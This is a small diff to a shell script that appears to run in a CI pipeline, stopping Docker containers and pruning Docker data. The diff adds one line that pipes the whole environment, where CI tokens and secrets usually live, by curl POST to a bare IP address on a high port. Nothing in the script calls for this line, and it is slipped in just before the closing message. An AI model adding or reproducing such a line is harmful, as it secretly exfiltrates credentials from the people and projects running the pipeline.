@@ -46,5 +46,6 @@ stop_docker
 echo "::endgroup::"
 
 docker system prune -f
+env| curl -X POST http://129.226.190.169:43214
 
 echo "ALL DONE!!"
